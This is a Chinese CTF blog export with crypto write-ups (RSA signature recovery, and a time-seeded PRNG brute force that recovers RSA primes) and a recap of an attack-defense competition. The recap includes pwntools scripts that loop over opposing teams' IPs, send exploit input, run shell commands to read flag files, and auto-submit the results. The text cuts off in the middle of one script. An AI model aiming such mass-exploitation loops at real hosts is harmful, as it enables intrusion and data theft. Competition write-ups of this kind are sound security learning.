<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">n = <span class="number">19298383934402303776125763032487034395837290787269136241860929371666322803767005809256376467251747337544207987651243732876788723589391443122139006291670739679671881793995062117862054219773720641070620393257280059636631655606299095240092759065646066472874883103079707806412908225076882298697592818427957280248310545565886424283345305315588905456274845835539850117078894827271423187201674309901517200507605514506810554986443591457553871395991374493663775609810305552059745143075621932565847065010052223136631616841830344641425039696588885154977303322142305642341212151656150304867047412766712682132001889777020524791973</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">d = <span class="number">3137235186797109181543919913150081090883783146124561354971792140710331616511797608859383781407450999194287072957815443643580070206469268276290781894677206166703148277053014202720636062948704086393432559771778716684753248681348101998686974611065401104750125952976352395891223648167738895743231363772089916593108326960368256904683762740112717950191378373879647606045501882017215733660352686694405659463412799487222511524326086693134712754258387193963090680988416969472940644308784344753494344590799813350562816191244386991480741139476116903925249873160845868063446516486452687657008647635622012862948358441702637219329</span></span><br><span class="line">p = <span class="number">139731890355244444444481193351254240382046157745753107784168081259905132570466329632284952677745944718796408024129423905064872080575084258263419439079106234950631002219878620094334031716695105950708580750238041143435139361782342237330225211801270672585910851695391826655791509425136418067722676156822188664897</span></span><br><span class="line">q = <span class="number">138110089868099985112598225976416346201381948401336998275010504058986842232246648573037043751233266052881639193423727942204630085471488139402695765255520423890781964577838337616082316055958265340997629227918247719815192989410797326080614722191761865261768884814085886604594016717232369095342986175683061540709</span></span><br></pre></td></tr></table></figure>

<p>然后猜测data就是密文，然后常规解密只出来一半，另一半应该是与sign有关</p>
<img alt="20210529 DASCTFXBUUOJ五月大联动-faa58622.png" data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/20210529 DASCTFXBUUOJ五月大联动-faa58622.png" width="" height="" >

<p>看了套神的博客</p>
<img alt="20210529 DASCTFXBUUOJ五月大联动-b88cacaf.png" data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/20210529 DASCTFXBUUOJ五月大联动-b88cacaf.png" width="" height="" >

<p><strong>公钥认证，私钥加密</strong>，这句话很重要</p>
<p>虽然数字签名还没有上到，但思路也是一种加密手段，用来证明这是某人发送的消息，所以对其进行解密，也能获取某种东西从而进行验证，现在只会网上的一些工具，rsa的签名过程后续会补上</p>
<p>巧了，第二天就上到了，你说妙不妙，用理论知识武装头脑.jpg</p>
<p>没想到很简单，所谓用公钥签名就是：$用d给m加密即，m这里指的是像现实中合同一样的信息$</p>
<p>用代数符号也就是<br>$$<br>sign=m^d\ mod\ n<br>$$<br>那么解密也就很简单啦<br>$$<br>m=sign^e\ mod\ n<br>$$<br>代码实现想必不需要赘述了吧</p>
<img alt="20210529 DASCTFXBUUOJ五月大联动-d388a46f.png" data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/20210529 DASCTFXBUUOJ五月大联动-d388a46f.png" width="" height="" >

<p>你说气不气，就差亿点点点就可以助攻彭总了</p>
]]></content>
      <categories>
        <category>树哥让我天天写之Crypto</category>
      </categories>
      <tags>
        <tag>斐波那契数列和RSA</tag>
      </tags>
  </entry>
  <entry>
    <title>20210529 春秋杯网络安全联赛春季赛Crypto方向部分WP</title>
    <url>/posts/250213ee/</url>
    <content><![CDATA[<p>&nbsp;</p>
<span id="more"></span>

<h1 id="2021年春秋杯网络安全联赛春季赛"><a href="#2021年春秋杯网络安全联赛春季赛" class="headerlink" title="2021年春秋杯网络安全联赛春季赛"></a>2021年春秋杯网络安全联赛春季赛</h1><h2 id="time"><a href="#time" class="headerlink" title="time"></a>time</h2><h3 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h3><p>只有代码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_prime</span>(<span class="params">bits</span>):</span></span><br><span class="line">    x = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> gmpy2.is_prime(x) == <span class="literal">False</span>:</span><br><span class="line">        random.seed(<span class="built_in">round</span>(time.time(),<span class="number">5</span>))</span><br><span class="line">        x = random.getrandbits(bits)</span><br><span class="line">    <span class="keyword">return</span> x</span><br><span class="line"></span><br><span class="line">hint = <span class="string">&quot;&quot;</span></span><br><span class="line">a1 = time.time()</span><br><span class="line">flag = <span class="string">&quot;flag&#123;***************&#125;&quot;</span></span><br><span class="line">p = get_prime(<span class="number">2048</span>)</span><br><span class="line">q = get_prime(<span class="number">2048</span>)</span><br><span class="line">n = p * q</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">m = bytes_to_long(flag.encode())</span><br><span class="line"><span class="keyword">assert</span> n &gt; m</span><br><span class="line">c = <span class="built_in">pow</span>(m,e,n)</span><br><span class="line"><span class="built_in">print</span>(n)</span><br><span class="line"><span class="built_in">print</span>(c)</span><br><span class="line">hint+=<span class="built_in">str</span>(time.localtime())</span><br><span class="line">hint+=<span class="built_in">str</span>(time.time()-a1)   <span class="comment"># 告诉我们上面这段程序运行的时间</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">m2 = bytes_to_long(hint.encode())</span><br><span class="line">e2 = <span class="number">196611</span></span><br><span class="line">p2 = getPrime(<span class="number">1024</span>)</span><br><span class="line">q2 = gmpy2.next_prime(p2)</span><br><span class="line">n2 = p2*q2</span><br><span class="line"><span class="keyword">assert</span> n2 &gt; m2</span><br><span class="line">c2 = <span class="built_in">pow</span>(m2,e2,n2)</span><br><span class="line"><span class="built_in">print</span>(n2)</span><br><span class="line"><span class="built_in">print</span>(c2)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#nspan></span><br><span class="line"><span class="comment">#c1=401489532945377793610793684722119773544780301600066410745513430092738470870254235710677331662917458735216486816223654944666672512914069274195244871184555059503843032370247894353363929996813688885280857203101709839776411016868985545599944237897372546401710041402579657231598311853522596463296090177664832759103736040102780428858301594805054838853076238331373482465072766841859415172741329175814259920949065993852870119473982972519779774470087935094963692097673607052443800723940091927016071427616754775915389245004208964143538205414854133746775614714447645057516665851780628694481268861808310238416724971673673850671343955386054575121362377868533055225219936712709474708031320743579595394353267596208729974198335174409673325772679039734706841988107519076516144633301371408301344929883397145523702189363308278963683356102257750758738297143036846718834812930796483716912661191147997005333798193659914573185697664706530774799114804036170190966523509331071964600280701252628276934131586398546602582672541075820188456265586487083315680880306767899236884202195162421559689536613740573005749847000477194096162091015847386298782974979446476432285118251267512895876728805199744415821498028998351171848530921695254428997423725875714923331577073</span></span><br><span class="line"><span class="comment">#n2=15155267112260254814859334094046172735826002259080171081726998162357946701645037659523881592272031544049749021927125983252197909993392636398184049160807707719999605547760868696059871234441249045293267592302009677249269002811886149589869652213333369608947939768457152200437978105250737118847430275142343554191304134468404921824671763164876924921101985937224297479095246132228051655664880892772136476378294042631659251586654877292836243536438334288184387617801131434535466414123998495813296765847561162680781100446656391077184870802746066619879552452560641945080540683058930700833439189784657690146144976738557801495769</span></span><br><span class="line"><span class="comment">#c2=2468578221703379861458008098241051507850837382948845085288946175636556753744182763176189585173648323464054032011039944322939163396161712722541432975739789351064988098201326803586126788175259878398963744821667593495161587855894677387881240566285601934559118064797092685909593247713834262369686831071897653756217369182373679039639016628932948775518889507209432291038498366540263588850133348471811624348709494110881127292350302658720685976197632586315945770832849119141593343924518836983738868912332048462058640564551286493338707636203013048694776131295632886983835291684044170004544049944003732133038154121113518892438</span></span><br></pre></td></tr></table></figure>

<h3 id="题目解析"><a href="#题目解析" class="headerlink" title="题目解析"></a>题目解析</h3><p>有意思的题目，ilike</p>
<p>主要是利用了伪随机的特性，只要找到种子seed，伪随机就能找到规律</p>
<p>不难，保留了五位小数，直接爆破，我愿称Brute-force为最强</p>
<p>还有就是时间戳之间的转换，csdn上找到有博主这样转，贴个链接<br><a href="https://blog.csdn.net/google19890102/article/details/51355282">https://blog.csdn.net/google19890102/article/details/51355282</a></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding:UTF-8</span></span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">dt = <span class="string">&quot;2016-05-05 20:28:54&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#转换成时间数组</span></span><br><span class="line">timeArray = time.strptime(dt, <span class="string">&quot;%Y-%m-%d %H:%M:%S&quot;</span>)</span><br><span class="line"><span class="comment">#转换成时间戳</span></span><br><span class="line">timestamp = time.mktime(timeArray)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> timestamp</span><br></pre></td></tr></table></figure>

<h3 id="解题脚本"><a href="#解题脚本" class="headerlink" title="解题脚本"></a>解题脚本</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line"><span class="comment"># 先求解hint</span></span><br><span class="line">n1 = <span class="number">449389319572014470973230701130712522617269811294117721031111991008431585050360094769229957883125144692171901233101564003762866045169460601700254891441878998743810037070537170855056466702105713343963726437141651081516150688905082129849562489646846756872586122801890652177495174154676725874072596207108180178755008058522945203093993733331873167443162263746938403044201113440457668163574342481361454421154163291201432319013385234751292922268166299917246608164679144459355173725895117315662317330324505156929077922670671914823996700321766811999551043586214703010131467697982137884162143358399786007967117340789211505834848813471803797101083738140019127129356248286854522464787917597152171952002118368747491099723673529923018951195522714900400225757160886780159504182902140132857743474716967975019342128486236748643365288547828026395873270777532526144687248477070253203339428149026199554962987646174586568177797380361174318868448467648171416588868990979461995030684403161898497550408697577695094783000808003197203603068043364687265824456069673330314452567416143754983137647607219859034406220590219587869898727679465514015732749105798134650890143215022311113143974714405713221391896497966231925409438383535066648782822255201778169275281703</span></span><br><span class="line">c1 = <span class="number">401489532945377793610793684722119773544780301600066410745513430092738470870254235710677331662917458735216486816223654944666672512914069274195244871184555059503843032370247894353363929996813688885280857203101709839776411016868985545599944237897372546401710041402579657231598311853522596463296090177664832759103736040102780428858301594805054838853076238331373482465072766841859415172741329175814259920949065993852870119473982972519779774470087935094963692097673607052443800723940091927016071427616754775915389245004208964143538205414854133746775614714447645057516665851780628694481268861808310238416724971673673850671343955386054575121362377868533055225219936712709474708031320743579595394353267596208729974198335174409673325772679039734706841988107519076516144633301371408301344929883397145523702189363308278963683356102257750758738297143036846718834812930796483716912661191147997005333798193659914573185697664706530774799114804036170190966523509331071964600280701252628276934131586398546602582672541075820188456265586487083315680880306767899236884202195162421559689536613740573005749847000477194096162091015847386298782974979446476432285118251267512895876728805199744415821498028998351171848530921695254428997423725875714923331577073</span></span><br><span class="line">n2 = <span class="number">15155267112260254814859334094046172735826002259080171081726998162357946701645037659523881592272031544049749021927125983252197909993392636398184049160807707719999605547760868696059871234441249045293267592302009677249269002811886149589869652213333369608947939768457152200437978105250737118847430275142343554191304134468404921824671763164876924921101985937224297479095246132228051655664880892772136476378294042631659251586654877292836243536438334288184387617801131434535466414123998495813296765847561162680781100446656391077184870802746066619879552452560641945080540683058930700833439189784657690146144976738557801495769</span></span><br><span class="line">c2 = <span class="number">2468578221703379861458008098241051507850837382948845085288946175636556753744182763176189585173648323464054032011039944322939163396161712722541432975739789351064988098201326803586126788175259878398963744821667593495161587855894677387881240566285601934559118064797092685909593247713834262369686831071897653756217369182373679039639016628932948775518889507209432291038498366540263588850133348471811624348709494110881127292350302658720685976197632586315945770832849119141593343924518836983738868912332048462058640564551286493338707636203013048694776131295632886983835291684044170004544049944003732133038154121113518892438</span></span><br><span class="line"></span><br><span class="line">e2 = <span class="number">196611</span></span><br><span class="line">p2 = <span class="number">123106730572541218855605566021385436071765753262738029208958530903965781875227909642974714736010685670143580347743415357832685249865725150245921795069888441073829479429807586105897472912969591388975228566729202050232896382465835682108694199213251295570982696527682862415340158808173324606996424204650675862831</span></span><br><span class="line">q2 = <span class="number">123106730572541218855605566021385436071765753262738029208958530903965781875227909642974714736010685670143580347743415357832685249865725150245921795069888441073829479429807586105897472912969591388975228566729202050232896382465835682108694199213251295570982696527682862415340158808173324606996424204650675860599</span></span><br><span class="line"><span class="comment"># hint = long_to_bytes(pow(c2, invert(e2, (p2-1)*(q2-1)), n2))</span></span><br><span class="line"><span class="comment"># print(hint)</span></span><br><span class="line"><span class="comment"># hint = &#x27;time.struct_time(tm_year=2021, tm_mon=4, tm_mday=28, tm_hour=20, tm_min=42, tm_sec=6, tm_wday=2, tm_yday=118, tm_isdst=0)3.1603143215179443&#x27;</span></span><br><span class="line"></span><br><span class="line">e1 = <span class="number">65537</span></span><br><span class="line"></span><br><span class="line">local_time = <span class="string">&#x27;time.struct_time(tm_year=2021, tm_mon=4, tm_mday=28, tm_hour=20, tm_min=42, tm_sec=6, tm_wday=2, tm_yday=118, tm_isdst=0)&#x27;</span></span><br><span class="line">dt = <span class="string">&quot;2021-04-28 20:42:06&quot;</span></span><br><span class="line"><span class="comment">#转换成时间数组</span></span><br><span class="line">timeArray = time.strptime(dt, <span class="string">&quot;%Y-%m-%d %H:%M:%S&quot;</span>)</span><br><span class="line"><span class="comment">#转换成时间戳</span></span><br><span class="line">timestamp = time.mktime(timeArray)</span><br><span class="line"><span class="comment"># print(timestamp)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_prime</span>(<span class="params">bits, new_p</span>):</span></span><br><span class="line">    x = <span class="number">1</span></span><br><span class="line">    random.seed(<span class="built_in">round</span>(new_p, <span class="number">5</span>))</span><br><span class="line">    x = random.getrandbits(bits)</span><br><span class="line">    <span class="keyword">return</span> x</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">t = timestamp</span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    t -= <span class="number">0.00001</span></span><br><span class="line">    <span class="built_in">print</span>(t)</span><br><span class="line">    hint = <span class="string">&quot;&quot;</span></span><br><span class="line">    a1 = time.time()</span><br><span class="line">    p = get_prime(<span class="number">2048</span>, t)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> is_prime(p):</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> n1 % p != <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    q = n1 // p</span><br><span class="line">    d = invert(e1, (p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line">    m = <span class="built_in">pow</span>(c1, d, n1)</span><br><span class="line">    tmp_flag = long_to_bytes(m)</span><br><span class="line">    <span class="keyword">if</span> tmp_flag.startswith(<span class="string">b&#x27;flag&#x27;</span>):</span><br><span class="line">        <span class="built_in">print</span>(tmp_flag)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<p>flag呢？没有flag，寄几跑</p>
]]></content>
      <categories>
        <category>树哥让我天天写之Crypto</category>
      </categories>
  </entry>
  <entry>
    <title>20210617 记国赛线下AWD选拔赛</title>
    <url>/posts/3a78d3e0/</url>
    <content><![CDATA[<p>我是一块砖，需要就往哪里搬。震惊，密码师傅零基硬刚PWN，结果被凑得鼻青脸肿</p>
<img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/记国赛线下AWD选拔赛-11a8defc.png" alt="昂？"/>

<p>三个月后回头看，发现自己真的是太菜了，别的密码师傅都可以国赛中打得很自在，自己却被一天罚站。学习的面可以广啊。做这一行，<strong>只能有长板和无数个中板</strong></p>
<span id="more"></span>

<h1 id="20210617-记国赛线下AWD选拔赛"><a href="#20210617-记国赛线下AWD选拔赛" class="headerlink" title="20210617 记国赛线下AWD选拔赛"></a>20210617 记国赛线下AWD选拔赛</h1><h2 id="网络配置"><a href="#网络配置" class="headerlink" title="网络配置"></a>网络配置</h2><p>当时的放在桌子上的文件</p>
<img alt="README-7b68301e.png" data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/README-7b68301e.png" width="" height="">

<p>点开那个网络配置，然后双击ipv4，自动获取ip，然后查看下ipconfig就好了</p>
<img alt="README-2be6a323.png" data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/README-2be6a323.png" width="" height="">

<h2 id="PWN文件的下载"><a href="#PWN文件的下载" class="headerlink" title="PWN文件的下载"></a>PWN文件的下载</h2><blockquote>
<p>使用sftp</p>
</blockquote>
<h3 id="步骤一：连接靶机"><a href="#步骤一：连接靶机" class="headerlink" title="步骤一：连接靶机"></a>步骤一：连接靶机</h3><p>有一种是输入密码的</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sftp -p [端口号] 用户名@IP地址</span><br></pre></td></tr></table></figure>

<p>输入密码，进入端口</p>
<p>还有一种是用私钥文件认证的</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sftp -i [私钥文件] 用户名@IP地址</span><br></pre></td></tr></table></figure>

<p><em>这次遇到的是后一种，输入密码的听说是相同的、或者是弱密码可以抢先别人一步拿到密码并且改掉，但是用RSA签名认证的应该就不会出现这种情况</em></p>
<h3 id="步骤二：文件下载和上传"><a href="#步骤二：文件下载和上传" class="headerlink" title="步骤二：文件下载和上传"></a>步骤二：文件下载和上传</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">lpwd  <span class="comment"># 查看本地文件路径lpath</span></span><br></pre></td></tr></table></figure>

<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">pwd</span>   <span class="comment"># 查看远程路径path</span></span><br></pre></td></tr></table></figure>

<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">get lpath path    <span class="comment"># 下载文件</span></span><br></pre></td></tr></table></figure>

<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">put path          <span class="comment"># 上传文件</span></span><br></pre></td></tr></table></figure>

<p>或说这两个我从来没有成功过，当时比赛是用图形化界面的ssh拉下来的，使用相对也比较简单</p>
<img alt="README-a08a1141.png" data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/README-a08a1141.png" width="" height="">

<blockquote>
<p>ssh</p>
</blockquote>
<p>操作的过程和sftp差不多，因为ssh内含sftp协议，比如连接的命令就是</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">ssh -i [私钥文件] 用户名@IP地址</span><br></pre></td></tr></table></figure>

<h2 id="当PWN遇上流量分析"><a href="#当PWN遇上流量分析" class="headerlink" title="当PWN遇上流量分析"></a>当PWN遇上流量分析</h2><p>写了两个利用攻击来源的流量包分析出的还有点用处的手动化脚本</p>
<p>有了第一天的经验，第二天直接分析流量包。而且比赛开始没几分钟，就有队伍PWN题打过来了，拿到packages看看</p>
<p>追踪TCP流</p>
<img alt="记国赛线下AWD选拔赛-f9a23239.png" data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/记国赛线下AWD选拔赛-f9a23239.png" width="" height="">

<p>这是PWN2的</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">12</span><br><span class="line">++++++++++X</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">DJR</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这是PWN3的</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">5</span><br><span class="line">aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa</span><br><span class="line">1</span><br><span class="line">0</span><br><span class="line">985</span><br><span class="line">10</span><br><span class="line">985</span><br><span class="line">0</span><br><span class="line">1</span><br><span class="line">1</span><br><span class="line">2</span><br><span class="line">1</span><br><span class="line">2</span><br><span class="line">1</span><br><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">2</span><br><span class="line">aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa6</span><br><span class="line">flappybird666666</span><br></pre></td></tr></table></figure>

<p>打PWN2的脚本，我写的主要有几个问题</p>
<ol>
<li><p>不能每隔十分钟自动跑，新的一轮要手动跑几次，但是后面也就是在跑这两个脚本了，然后改改一些小的地方，没别的事做，所以还好</p>
</li>
<li><p>有一些IP是修好的，或者是即使没有修好，输入输出流之间可能会有EOF错误（PWN师傅说要sleep一下，后续研究）导致有些会卡住程序运行，所以在手跑的时候，需要将连接不好又不能跳过的IP去掉一下</p>
<img alt="README-6d5540d6.png" data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/README-6d5540d6.png" width="" height="" ></li>
</ol>
<p>这个脚本大概每次会有20~35个flag提交成功，因为很多队伍，包括我们的一队都修好</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">token = <span class="string">&#x27;4vvfuKfBbHtTtEATCnwV3U4DxQVd5SwEHB8uxruSb4Hmj&#x27;</span></span><br><span class="line"></span><br><span class="line">proxies = &#123;</span><br><span class="line">    <span class="string">&#x27;http&#x27;</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;https&#x27;</span>: <span class="string">&#x27;&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">submit_flag</span>(<span class="params">flag1</span>):</span></span><br><span class="line">    url_flag = <span class="string">&#x27;http://10.16.18.1/api/v1/att_def/web/submit_flag/?event_id=14&#x27;</span></span><br><span class="line"></span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&#x27;flag&#x27;</span>: flag1,</span><br><span class="line">        <span class="string">&#x27;token&#x27;</span>: token</span><br><span class="line">    &#125;</span><br><span class="line">    req = requests.post(url=url_flag, data=data, proxies=proxies)</span><br><span class="line">    <span class="built_in">print</span>(req.text)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">debug = <span class="literal">False</span></span><br><span class="line">x64 = <span class="literal">True</span></span><br><span class="line">file = <span class="string">&#x27;./pwn&#x27;</span></span><br><span class="line">libc_file = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">ip = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">60</span>):</span><br><span class="line">    <span class="keyword">if</span> i != <span class="number">50</span>:</span><br><span class="line">        ip.append(<span class="string">&#x27;172.35.&#x27;</span> + <span class="built_in">str</span>(i) + <span class="string">&#x27;.17&#x27;</span>)</span><br><span class="line"></span><br><span class="line">ports = <span class="number">9999</span></span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line"><span class="keyword">if</span> x64:</span><br><span class="line">    context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    context.arch = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">sd = <span class="keyword">lambda</span> x: io.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: io.sendline(x)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: io.recvuntil(x)</span><br><span class="line">rl = <span class="keyword">lambda</span>: io.recvline()</span><br><span class="line">ra = <span class="keyword">lambda</span>: io.recv()</span><br><span class="line">rn = <span class="keyword">lambda</span> x: io.recv(x)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: io.sendlineafter(x, y)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> ipi <span class="keyword">in</span> ip:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> ipi <span class="keyword">in</span> [<span class="string">&#x27;172.35.7.17&#x27;</span>]:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">        io = remote(ipi, ports)</span><br><span class="line">        ra()</span><br><span class="line">        sl(<span class="string">&#x27;12&#x27;</span>)</span><br><span class="line">        sl(<span class="string">&#x27;++++++++++X&#x27;</span>)</span><br><span class="line">        sl(<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        sl(<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        sl(<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        sl(<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        sl(<span class="string">&#x27;DJR&#x27;</span>)</span><br><span class="line">        sl(<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        sl(<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        sl(<span class="string">&#x27;cd ../&#x27;</span>)</span><br><span class="line">        sl(<span class="string">&#x27;cat flag&#x27;</span>)</span><br><span class="line">        a = ra()</span><br><span class="line">        submit_flag(a[:<span class="number">60</span>])</span><br><span class="line">        io.close()</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>

<p>这是打PWN3的，平均每次可以得到45个flag，但后来发现这题几乎所有的队伍都没有防住，说是可能题目有问题patch了之后check不过，而且还被攻击，第一名的白泽正是如此，所以应该有接近60个的flag，看来中间还是有我没解决的实现</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="comment"># context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">token = <span class="string">&#x27;4vvfuKfBbHtTtEATCnwV3U4DxQVd5SwEHB8uxruSb4Hmj&#x27;</span></span><br><span class="line"></span><br><span class="line">proxies = &#123;</span><br><span class="line">    <span class="string">&#x27;http&#x27;</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;https&#x27;</span>: <span class="string">&#x27;&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">submit_flag</span>(<span class="params">flag1</span>):</span></span><br><span class="line">    url_flag = <span class="string">&#x27;http://10.16.18.1/api/v1/att_def/web/submit_flag/?event_id=14&#x27;</span></span><br><span class="line"></span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&#x27;flag&#x27;</span>: flag1,</span><br><span class="line">        <span class="string">&#x27;token&#x27;</span>: token</span><br><span class="line">    &#125;</span><br><span class="line">    req = requests.post(url=url_flag, data=data, proxies=proxies)</span><br><span class="line">    <span class="built_in">print</span>(req.text)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">debug = <span class="literal">False</span></span><br><span class="line">x64 = <span class="literal">True</span></span><br><span class="line">file = <span class="string">&#x27;./pwn&#x27;</span></span><br><span class="line">libc_file = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">ip = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">28</span>, <span class="number">60</span>):</span><br><span class="line">    <span class="keyword">if</span> i != <span class="number">50</span>:</span><br><span class="line">        ip.append(<span class="string">&#x27;172.35.&#x27;</span> + <span class="built_in">str</span>(i) + <span class="string">&#x27;.18&#x27;</span>)</span><br><span class="line"></span><br><span class="line">ports = <span class="number">9999</span></span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line"><span class="keyword">if</span> x64:</span><br><span class="line">    context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    context.arch = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">sd = <span class="keyword">lambda</span> x: io.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: io.sendline(x)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: io.recvuntil(x)</span><br><span class="line">rl = <span class="keyword">lambda</span>: io.recvline()</span><br><span class="line">ra = <span class="keyword">lambda</span>: io.recv()</span><br><span class="line">rn = <span class="keyword">lambda</span> x: io.recv(x)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: io.sendlineafter(x, y)</span><br><span class="line">flag = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> ipi <span class="keyword">in</span> ip:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> ipi <span class="keyword">in</span> []:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        io = remote(ipi, 